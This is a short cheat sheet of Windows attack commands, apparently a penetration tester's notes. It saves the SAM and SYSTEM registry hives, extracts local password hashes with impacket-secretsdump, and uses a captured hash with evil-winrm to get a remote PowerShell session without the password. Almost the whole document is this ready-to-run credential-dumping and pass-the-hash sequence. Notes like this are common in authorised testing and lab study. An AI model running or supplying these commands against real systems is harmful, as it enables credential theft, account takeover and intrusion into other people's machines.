# Interesting Commands

Save SAM file:

```powershell
reg save HKLM\sam ./sam.save
```

Save SYSTEM file:

```powershell
reg save HKLM\system ./system.save
```

Use impacket to get password hashes:

```bash
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

Evilwin-rm to get PowerShell access:

```bash
evil-winrm -i [IP] -u [username] -H [hash]
```

